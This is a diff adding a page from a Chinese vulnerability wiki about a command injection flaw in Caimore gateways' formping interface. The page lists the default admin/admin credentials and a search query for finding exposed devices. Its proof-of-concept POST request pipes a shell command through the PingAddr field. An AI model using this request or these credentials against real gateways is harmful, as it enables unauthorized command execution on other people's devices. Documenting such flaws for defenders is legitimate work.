@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1%20%E7%BD%91%E5%85%B3%20formping%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>才茂通信 网关 formping 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u624d\u8302\u901a\u4fe1 \u7f51\u5173 formping \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20CVE-2021-27328/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20CVE-2021-27328/" class="btn btn-xs btn-link">
+        朗视 TG400 GSM 网关目录遍历 CVE-2021-27328
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        惠尔顿 e地通 config.xml 信息泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="formping">才茂通信 网关 formping 远程命令执行漏洞<a class="headerlink" href="#formping" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>才茂通信网关 formping 接口存在远程命令执行漏洞，攻击者通过默认口令 admin/admin 登陆系统后通过命令可以获取服务器权限</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>才茂通信 网关
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;CAIMORE-Gateway&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登陆页面，默认口令 admin/admin</p>
+<p><img alt="image-20230417100349175" src="../images/image-20230417100349175.png" /></p>
+<p>验证POC</p>
+<div class="highlight"><pre><span></span><code>POST /goform/formping
+Authorization: Basic YWRtaW46YWRtaW4=
+
+PingAddr=www.baidu.com%7Cls&amp;PingPackNumb=1&amp;PingMsg=
+</code></pre></div>
+<p><img alt="image-20230417100401289" src="../images/image-20230417100401289.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20CVE-2021-27328/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20CVE-2021-27328/" class="btn btn-xs btn-link">
+        朗视 TG400 GSM 网关目录遍历 CVE-2021-27328
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        惠尔顿 e地通 config.xml 信息泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
